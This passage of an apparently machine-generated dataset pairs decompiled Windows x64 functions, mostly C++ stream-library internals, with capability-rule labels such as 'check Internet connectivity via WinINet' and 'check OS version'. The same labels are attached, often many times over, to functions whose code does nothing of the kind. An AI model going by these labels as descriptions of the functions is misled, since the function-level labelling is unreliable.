iVar6 = (**(**(arg1 + 0xa0) + 0x40))();\n        iVar10 = iVar6 * arg3;\n        _auStack176 = 0x140085be9;\n        iVar8 = fcn.14000e880(iVar10);\n        piVar1 = *(arg1 + 0xa0);\n        iVar8 = -iVar8;\n        puVar13 = &fcn.140085b90::var_1ch + iVar8 + 4;\n        puVar12 = &fcn.140085b90::var_1ch + iVar8 + 4;\n        iVar2 = *piVar1;\n        arg2_00 = &stack0xffffffffffffff98 + iVar8;\n        *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n        *(&stack0xffffffffffffff88 + iVar8) = arg2_00 + iVar10;\n        *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n        *(&fcn.140085b90::var_8h + iVar8) = &stack0xffffffffffffffb0;\n        pcVar3 = *(iVar2 + 0x10);\n        *(&stack0xffffffffffffff50 + iVar8) = 0x140085c2e;\n        uVar7 = (*pcVar3)(piVar1, arg1 + 0x68, arg2);\n        if (uVar7 < 2) {\n            uStack100 = uVar7;\n            iStack96 = iStack88;\n            arg3 = iStack88 - arg2_00;\n            *(&stack0xffffffffffffff50 + iVar8) = 0x140085c8b;\n            uVar9 = fcn.14007c120(arg1 + 0x50, arg2_00, arg3);\n            iVar2 = iStack96;\n            if ((arg3 != uVar9) || ((uStack100 & 1) == 0)) goto code_r0x000140085c4b;\n            piVar1 = *(arg1 + 0xa0);\n            iVar10 = *piVar1;\n            *(&stack0xffffffffffffff90 + iVar8) = &stack0xffffffffffffffa8;\n            *(&stack0xffffffffffffff88 + iVar8) = iVar2;\n            *(&stack0xffffffffffffff80 + iVar8) = arg2_00;\n            *(&fcn.140085b90::var_8h + iVar8) = &stack0xffffffffffffffb0;\n            uVar4 = *(arg1 + 0x28);\n            pcVar3 = *(iVar10 + 0x10);\n            *(&stack0xffffffffffffff50 + iVar8) = 0x140085cca;\n            iVar6 = (*pcVar3)(piVar1, arg1 + 0x68, uStack80, uVar4);\n            if (iVar6 != 2) {\n                arg3 = iStack88 - arg2_00;\n                *(&stack0xffffffffffffff50 + iVar8) = 0x140085ce4;\n                uVar9 = fcn.14007c120(arg1 + 0x50, arg2_00, arg3);\n                goto code_r0x000140085c4b;\n            }\n        }\n        else if (uVar7 == 3) goto code_r0x000140085c3c;\n        pcVar11 = \"basic_filebuf::_M_convert_to_external conversion error\";\n        *(&stack0xffffffffffffff50 + iVar8) = 0x140085cf5;\n        fcn.1400b76e0(\"basic_filebuf::_M_convert_to_external conversion error\");\ncode_r0x000140085cf5:\n        *(puVar13 + -8) = 0x140085cfa;\n        uVar9 = fcn.1400b7000();\n        *(puVar13 + -8) = arg1;\n        if (*(pcVar11 + 0x80) != '\\0') {\n            if (*(pcVar11 + 0x70) != 0) {\n                *(puVar13 + -0x30) = 0x140085d1f;\n                uVar9 = fcn.1400b64c0();\n            }\n            *(pcVar11 + 0x70) = 0;\n            *(pcVar11 + 0x80) = 0;\n        }\n        if (*(pcVar11 + 0xa8) != 0) {\n            *(puVar13 + -0x30) = 0x140085d3f;\n            uVar9 = fcn.1400b64c0();\n        }\n        *(pcVar11 + 0xa8) = 0;\n        *(pcVar11 + 0xb0) = 0;\n        *(pcVar11 + 0xb8) = 0x0;\n        return uVar9;\n    }\ncode_r0x000140085c3c:\n    *(puVar12 + -8) = 0x140085c4b;\n    uVar9 = fcn.14007c120(arg1 + 0x50, arg2, arg3);\ncode_r0x000140085c4b:\n    return uVar9 & 0xffffffffffffff00 | uVar9 == arg3;\n}\n",
        "token_count": 1497
    },
    "140085d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140085d70(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    char cVar2;\n    int64_t *in_RAX;\n    int64_t *piVar3;\n    int64_t iVar4;\n    ulong *in_RDX;\n    uchar *puVar5;\n    uint64_t unaff_RBP;\n    uint64_t arg3;\n    ulong *unaff_RSI;\n    int64_t *unaff_RDI;\n    uint64_t in_R8;\n    uint64_t uVar6;\n    uchar auStack40 [32];\n    \n    if ((*(arg1 + 0x10) != '\\0') || (arg1[0xe] != 0)) {\n        return in_RAX;\n    }\n    piVar3 = arg1[0xf];\n    if (piVar3 < 0x3ffffffffffffffd) {\n        piVar3 = fcn.1400b64f0(piVar3 * 2);\n        *(arg1 + 0x10) = 1;\n        arg1[0xe] = piVar3;\n        return piVar3;\n    }\n    fcn.1400b7660();\n    puVar5 = auStack40;\n    while( true ) {\n        *(puVar5 + -8) = unaff_RBP;\n        *(puVar5 + -0x10) = unaff_RDI;\n        *(puVar5 + -0x18) = unaff_RSI;\n        *(puVar5 + -0x20) = arg1;\n        arg1_00 = piVar3 + 10;\n        arg3 = in_R8 & 0xffffffff;\n        *(puVar5 + -0x70) = 0x140085ded;\n        cVar2 = fcn.1400211d0(arg1_00);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(puVar5 + -0x70) = 0x140085e09;\n        unaff_RSI = in_RDX;\n        uVar6 = arg3;\n        fcn.14007bf30(arg1_00, in_RDX, arg3);\n        *(puVar5 + -0x70) = 0x140085e11;\n        cVar2 = fcn.1400211d0(arg1_00);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar4 = piVar3[0xe];\n        if ((*(piVar3 + 0x10) != '\\0') || (iVar4 != 0)) break;\n        arg1 = piVar3[0xf];\n        if (arg1 < 0x3ffffffffffffffd) {\n            *(puVar5 + -0x70) = 0x140085ed3;\n            iVar4 = fcn.1400b64f0(arg1 * 2);\n            *(piVar3 + 0x10) = 1;\n            piVar3[0xe] = iVar4;\n            break;\n        }\n        *(puVar5 + -0x70) = 0x140085ee8;\n        fcn.1400b7660();\n        *(puVar5 + -0x70) = arg3;\n        *(puVar5 + -0x78) = arg1_00;\n        *(puVar5 + -0x80) = in_RDX;\n        *(puVar5 + -0x88) = piVar3;\n        unaff_RDI = arg1 + 10;\n        unaff_RBP = uVar6 & 0xffffffff;\n        *(puVar5 + -0xd8) = 0x140085f0d;\n        cVar2 = fcn.1400211d0(unaff_RDI);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(puVar5 + -0xd8) = 0x140085f23;\n        in_RDX = unaff_RSI;\n        in_R8 = unaff_RBP;\n        fcn.14007bf80(unaff_RDI, unaff_RSI, unaff_RBP);\n        *(puVar5 + -0xd8) = 0x140085f2b;\n        cVar2 = fcn.1400211d0(unaff_RDI);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar4 = arg1[0xe];\n        if ((*(arg1 + 0x10) != '\\0') || (iVar4 != 0)) {\ncode_r0x000140085f49:\n            *(arg1 + 0xc) = unaff_RBP;\n            arg1[3] = iVar4;\n            arg1[1] = iVar4;\n            arg1[2] = iVar4;\n            *(arg1 + 4) = 0x0;\n            *(arg1 + 0x81) = 0;\n            arg1[6] = 0;\n            arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n            if ((uVar6 & 2) == 0) {\n                return arg1;\n            }\n            iVar4 = *arg1;\n            *(puVar5 + -0xb0) = unaff_RBP;\n            pcVar1 = *(iVar4 + 0x20);\n            *(puVar5 + -0xd8) = 0x140085fbb;\n            (*pcVar1)(puVar5 + -0xa0, arg1, 0, 2);\n            if (*(puVar5 + -0xa0) == -1) {\n                *(puVar5 + -0xd8) = 0x140085fcb;\n                fcn.140086280(arg1);\n                return NULL;\n            }\n            return arg1;\n        }\n        piVar3 = arg1[0xf];\n        if (piVar3 < 0x3ffffffffffffffd) {\n            *(puVar5 + -0xd8) = 0x140085ff3;\n            iVar4 = fcn.1400b64f0(piVar3 * 2);\n            *(arg1 + 0x10) = 1;\n            arg1[0xe] = iVar4;\n            goto code_r0x000140085f49;\n        }\n        *(puVar5 + -0xd8) = 0x140086008;\n        fcn.1400b7660();\n        in_RDX = *in_RDX;\n        puVar5 = puVar5 + -0xd0;\n    }\n    *(piVar3 + 0xc) = arg3;\n    piVar3[3] = iVar4;\n    piVar3[1] = iVar4;\n    piVar3[2] = iVar4;\n    *(piVar3 + 4) = 0x0;\n    *(piVar3 + 0x81) = 0;\n    piVar3[6] = 0;\n    piVar3[0xd] = CONCAT44(*(piVar3 + 100), *(piVar3 + 100));\n    if ((in_R8 & 2) == 0) {\n        return piVar3;\n    }\n    iVar4 = *piVar3;\n    *(puVar5 + -0x48) = arg3;\n    pcVar1 = *(iVar4 + 0x20);\n    *(puVar5 + -0x70) = 0x140085e9b;\n    (*pcVar1)(puVar5 + -0x38, piVar3, 0, 2);\n    if (*(puVar5 + -0x38) == -1) {\n        *(puVar5 + -0x70) = 0x140085eab;\n        fcn.140086280(piVar3);\n        return NULL;\n    }\n    return piVar3;\n}\n",
        "token_count": 1732
    },
    "140085dd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140085dd0(int64_t *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    int64_t *unaff_RBX;\n    uint64_t unaff_RBP;\n    uint64_t arg3_00;\n    ulong *unaff_RSI;\n    int64_t *unaff_RDI;\n    uint64_t uVar4;\n    \n    while( true ) {\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        arg1_00 = arg1 + 10;\n        arg3_00 = arg3 & 0xffffffff;\n        *(*0x20 + -0x70) = 0x140085ded;\n        cVar2 = fcn.1400211d0(arg1_00);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0x70) = 0x140085e09;\n        unaff_RSI = arg2;\n        uVar4 = arg3_00;\n        fcn.14007bf30(arg1_00, arg2, arg3_00);\n        *(*0x20 + -0x70) = 0x140085e11;\n        cVar2 = fcn.1400211d0(arg1_00);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = arg1[0xe];\n        if ((*(arg1 + 0x10) != '\\0') || (iVar3 != 0)) break;\n        unaff_RBX = arg1[0xf];\n        if (unaff_RBX < 0x3ffffffffffffffd) {\n            *(*0x20 + -0x70) = 0x140085ed3;\n            iVar3 = fcn.1400b64f0(unaff_RBX * 2);\n            *(arg1 + 0x10) = 1;\n            arg1[0xe] = iVar3;\n            break;\n        }\n        *(*0x20 + -0x70) = 0x140085ee8;\n        fcn.1400b7660();\n        *(*0x20 + -0x70) = arg3_00;\n        *(*0x20 + -0x78) = arg1_00;\n        *(*0x20 + -0x80) = arg2;\n        *(*0x20 + -0x88) = arg1;\n        unaff_RDI = unaff_RBX + 10;\n        unaff_RBP = uVar4 & 0xffffffff;\n        *(*0x20 + -0xd8) = 0x140085f0d;\n        cVar2 = fcn.1400211d0(unaff_RDI);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0xd8) = 0x140085f23;\n        arg2 = unaff_RSI;\n        arg3 = unaff_RBP;\n        fcn.14007bf80(unaff_RDI, unaff_RSI, unaff_RBP);\n        *(*0x20 + -0xd8) = 0x140085f2b;\n        cVar2 = fcn.1400211d0(unaff_RDI);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = unaff_RBX[0xe];\n        if ((*(unaff_RBX + 0x10) != '\\0') || (iVar3 != 0)) {\ncode_r0x000140085f49:\n            *(unaff_RBX + 0xc) = unaff_RBP;\n            unaff_RBX[3] = iVar3;\n            unaff_RBX[1] = iVar3;\n            unaff_RBX[2] = iVar3;\n            *(unaff_RBX + 4) = 0x0;\n            *(unaff_RBX + 0x81) = 0;\n            unaff_RBX[6] = 0;\n            unaff_RBX[0xd] = CONCAT44(*(unaff_RBX + 100), *(unaff_RBX + 100));\n            if ((uVar4 & 2) == 0) {\n                return unaff_RBX;\n            }\n            iVar3 = *unaff_RBX;\n            *(*0x20 + -0xb0) = unaff_RBP;\n            pcVar1 = *(iVar3 + 0x20);\n            *(*0x20 + -0xd8) = 0x140085fbb;\n            (*pcVar1)(*0x20 + -0xa0, unaff_RBX, 0, 2);\n            if (*(*0x20 + -0xa0) == -1) {\n                *(*0x20 + -0xd8) = 0x140085fcb;\n                fcn.140086280(unaff_RBX);\n                return NULL;\n            }\n            return unaff_RBX;\n        }\n        arg1 = unaff_RBX[0xf];\n        if (arg1 < 0x3ffffffffffffffd) {\n            *(*0x20 + -0xd8) = 0x140085ff3;\n            iVar3 = fcn.1400b64f0(arg1 * 2);\n            *(unaff_RBX + 0x10) = 1;\n            unaff_RBX[0xe] = iVar3;\n            goto code_r0x000140085f49;\n        }\n        *(*0x20 + -0xd8) = 0x140086008;\n        fcn.1400b7660();\n        arg2 = *arg2;\n        *0x20 = *0x20 + -0xd0;\n    }\n    *(arg1 + 0xc) = arg3_00;\n    arg1[3] = iVar3;\n    arg1[1] = iVar3;\n    arg1[2] = iVar3;\n    *(arg1 + 4) = 0x0;\n    *(arg1 + 0x81) = 0;\n    arg1[6] = 0;\n    arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n    if ((arg3 & 2) == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    *(*0x20 + -0x48) = arg3_00;\n    pcVar1 = *(iVar3 + 0x20);\n    *(*0x20 + -0x70) = 0x140085e9b;\n    (*pcVar1)(*0x20 + -0x38, arg1, 0, 2);\n    if (*(*0x20 + -0x38) == -1) {\n        *(*0x20 + -0x70) = 0x140085eab;\n        fcn.140086280(arg1);\n        return NULL;\n    }\n    return arg1;\n}\n",
        "token_count": 1601
    },
    "140085ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.140085ef0(int64_t *arg1, ulong *arg2, uint64_t arg3)\n\n{\n    int64_t *arg1_00;\n    code *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t *unaff_RBX;\n    uint64_t unaff_RBP;\n    uint64_t arg3_00;\n    ulong *unaff_RSI;\n    int64_t *unaff_RDI;\n    uint64_t uVar5;\n    \n    while( true ) {\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        arg1_00 = arg1 + 10;\n        arg3_00 = arg3 & 0xffffffff;\n        *(*0x20 + -0x70) = 0x140085f0d;\n        cVar2 = fcn.1400211d0(arg1_00);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0x70) = 0x140085f23;\n        puVar4 = arg2;\n        uVar5 = arg3_00;\n        fcn.14007bf80(arg1_00, arg2, arg3_00);\n        *(*0x20 + -0x70) = 0x140085f2b;\n        cVar2 = fcn.1400211d0(arg1_00);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = arg1[0xe];\n        if ((*(arg1 + 0x10) != '\\0') || (iVar3 != 0)) break;\n        unaff_RBX = arg1[0xf];\n        if (unaff_RBX < 0x3ffffffffffffffd) {\n            *(*0x20 + -0x70) = 0x140085ff3;\n            iVar3 = fcn.1400b64f0(unaff_RBX * 2);\n            *(arg1 + 0x10) = 1;\n            arg1[0xe] = iVar3;\n            break;\n        }\n        *(*0x20 + -0x70) = 0x140086008;\n        fcn.1400b7660();\n        unaff_RSI = *puVar4;\n        *(*0x20 + -0x70) = arg3_00;\n        *(*0x20 + -0x78) = arg1_00;\n        *(*0x20 + -0x80) = arg2;\n        *(*0x20 + -0x88) = arg1;\n        unaff_RDI = unaff_RBX + 10;\n        unaff_RBP = uVar5 & 0xffffffff;\n        *(*0x20 + -0xd8) = 0x140085ded;\n        cVar2 = fcn.1400211d0(unaff_RDI);\n        if (cVar2 != '\\0') {\n            return NULL;\n        }\n        *(*0x20 + -0xd8) = 0x140085e09;\n        arg2 = unaff_RSI;\n        arg3 = unaff_RBP;\n        fcn.14007bf30(unaff_RDI, unaff_RSI, unaff_RBP);\n        *(*0x20 + -0xd8) = 0x140085e11;\n        cVar2 = fcn.1400211d0(unaff_RDI);\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        iVar3 = unaff_RBX[0xe];\n        if ((*(unaff_RBX + 0x10) != '\\0') || (iVar3 != 0)) {\ncode_r0x000140085e2f:\n            *(unaff_RBX + 0xc) = unaff_RBP;\n            unaff_RBX[3] = iVar3;\n            unaff_RBX[1] = iVar3;\n            unaff_RBX[2] = iVar3;\n            *(unaff_RBX + 4) = 0x0;\n            *(unaff_RBX + 0x81) = 0;\n            unaff_RBX[6] = 0;\n            unaff_RBX[0xd] = CONCAT44(*(unaff_RBX + 100), *(unaff_RBX + 100));\n            if ((uVar5 & 2) == 0) {\n                return unaff_RBX;\n            }\n            iVar3 = *unaff_RBX;\n            *(*0x20 + -0xb0) = unaff_RBP;\n            pcVar1 = *(iVar3 + 0x20);\n            *(*0x20 + -0xd8) = 0x140085e9b;\n            (*pcVar1)(*0x20 + -0xa0, unaff_RBX, 0, 2);\n            if (*(*0x20 + -0xa0) == -1) {\n                *(*0x20 + -0xd8) = 0x140085eab;\n                fcn.140086280(unaff_RBX);\n                return NULL;\n            }\n            return unaff_RBX;\n        }\n        arg1 = unaff_RBX[0xf];\n        if (arg1 < 0x3ffffffffffffffd) {\n            *(*0x20 + -0xd8) = 0x140085ed3;\n            iVar3 = fcn.1400b64f0(arg1 * 2);\n            *(unaff_RBX + 0x10) = 1;\n            unaff_RBX[0xe] = iVar3;\n            goto code_r0x000140085e2f;\n        }\n        *(*0x20 + -0xd8) = 0x140085ee8;\n        fcn.1400b7660();\n        *0x20 = *0x20 + -0xd0;\n    }\n    *(arg1 + 0xc) = arg3_00;\n    arg1[3] = iVar3;\n    arg1[1] = iVar3;\n    arg1[2] = iVar3;\n    *(arg1 + 4) = 0x0;\n    *(arg1 + 0x81) = 0;\n    arg1[6] = 0;\n    arg1[0xd] = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n    if ((arg3 & 2) == 0) {\n        return arg1;\n    }\n    iVar3 = *arg1;\n    *(*0x20 + -0x48) = arg3_00;\n    pcVar1 = *(iVar3 + 0x20);\n    *(*0x20 + -0x70) = 0x140085fbb;\n    (*pcVar1)(*0x20 + -0x38, arg1, 0, 2);\n    if (*(*0x20 + -0x38) == -1) {\n        *(*0x20 + -0x70) = 0x140085fcb;\n        fcn.140086280(arg1);\n        return NULL;\n    }\n    return arg1;\n}\n",
        "token_count": 1612
    },
    "14008628": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140086280(int64_t arg1)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int64_t iVar3;\n    \n    cVar2 = fcn.1400211d0(arg1 + 0x50);\n    if (cVar2 != '\\0') {\n        cVar2 = fcn.140085a70(arg1);\n        *(arg1 + 0x60) = 0;\n        *(arg1 + 0x98) = 0;\n        if (*(arg1 + 0x80) != '\\0') {\n            if (*(arg1 + 0x70) != 0) {\n                fcn.1400b64c0();\n            }\n            *(arg1 + 0x70) = 0;\n            *(arg1 + 0x80) = 0;\n        }\n        if (*(arg1 + 0xa8) != 0) {\n            fcn.1400b64c0();\n        }\n        uVar1 = *(arg1 + 0x70);\n        *(arg1 + 0xa8) = 0;\n        *(arg1 + 0x18) = uVar1;\n        *(arg1 + 0xb0) = 0;\n        *(arg1 + 0x81) = 0;\n        *(arg1 + 0x30) = 0;\n        *(arg1 + 0xb8) = 0x0;\n        *(arg1 + 0x20) = 0x0;\n        *(arg1 + 8) = uVar1;\n        *(arg1 + 0x10) = uVar1;\n        *(arg1 + 0x68) = CONCAT44(*(arg1 + 100), *(arg1 + 100));\n        iVar3 = fcn.14007c050(arg1 + 0x50);\n        if ((iVar3 != 0) && (cVar2 == '\\x01')) {\n            return arg1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 442
    },
    "1400af3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.1400af3c0(int64_t arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    char *in_RAX;\n    char *arg1_00;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [8];\n    \n    if (*(arg1 + 0xe8) == 0) {\n        arg2._0_4_ = arg2 | 1;\n    }\n    *(arg1 + 0x20) = arg2;\n    arg2._0_4_ = arg2 & *(arg1 + 0x1c);\n    arg2_00 = arg2;\n    if (arg2 == 0) {\n        return in_RAX;\n    }\n    arg1_00 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    fcn.14009fa10(arg1_00, arg2_00 + 0xd0);\n    fcn.1400ad170(auStack88, arg2_00, in_R8);\n    fcn.14009fb20(auStack88);\n    fcn.1400af0e0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.14009fa10(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.14009fb80(piVar1 + 7, in_R8);\n        fcn.14009fb20(auStack88);\n    }\n    return arg1_00;\n}\n",
        "token_count": 380
    },
    "14008c77": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * fcn.14008c770(uchar *arg1, int64_t **arg2, uchar *arg3)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    char cVar5;\n    int16_t iVar6;\n    uint16_t uVar7;\n    ulong uVar8;\n    int64_t iVar9;\n    int64_t *piVar10;\n    int64_t *piVar11;\n    int16_t *piVar12;\n    char *arg1_00;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int64_t **ppiVar15;\n    int64_t *piVar16;\n    int16_t *piVar17;\n    uint64_t arg2_00;\n    uchar *unaff_RBX;\n    uchar *puVar18;\n    int64_t *unaff_RBP;\n    uchar *unaff_RSI;\n    int64_t *unaff_RDI;\n    uchar *puVar19;\n    uchar *puVar20;\n    int16_t in_R9W;\n    int16_t *piVar21;\n    ulong unaff_R12;\n    int64_t *piVar22;\n    ulong unaff_R13;\n    ulong unaff_R14;\n    int16_t *piVar23;\n    uchar *puVar24;\n    ulong unaff_R15;\n    char acStack273 [73];\n    uchar auStack200 [32];\n    int64_t *piStack168;\n    uchar *puStack160;\n    int64_t *piStack152;\n    uchar auStack144 [40];\n    uchar *puStack104;\n    uchar *puStack96;\n    int64_t *piStack88;\n    int64_t *piStack80;\n    uchar auStack72 [40];\n    \n    piVar22 = *arg2;\n    *arg1 = 0;\n    cVar5 = arg3;\n    iVar9 = piVar22[-3] + arg2;\n    uVar14 = *(iVar9 + 0x20);\n    if (uVar14 != 0) goto code_r0x0001400af3c0;\n    piVar22 = *(iVar9 + 0xd8);\n    if (piVar22 == NULL) {\n        if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x00014008c7e3:\n            *arg1 = 1;\n            return piVar22;\n        }\n    }\n    else {\n        piStack80 = 0x14008c7a9;\n        fcn.14008dca0(piVar22);\n        piVar22 = *arg2;\n        iVar9 = piVar22[-3] + arg2;\n        if ((cVar5 != '\\0') || ((*(iVar9 + 0x19) & 0x10) == 0)) {\ncode_r0x00014008c7be:\n            uVar14 = *(iVar9 + 0x20);\n            if (uVar14 == 0) goto code_r0x00014008c7e3;\n            goto code_r0x0001400af3c0;\n        }\n    }\n    piVar1 = *(iVar9 + 0xe8);\n    piVar22 = piVar1[2];\n    if (piVar22 < piVar1[3]) {\n        uVar7 = *piVar22;\n    }\n    else {\n        piStack80 = 0x14008c8e8;\n        uVar7 = (**(*piVar1 + 0x48))(piVar1);\n        piVar22 = *arg2;\n        iVar9 = piVar22[-3] + arg2;\n    }\n    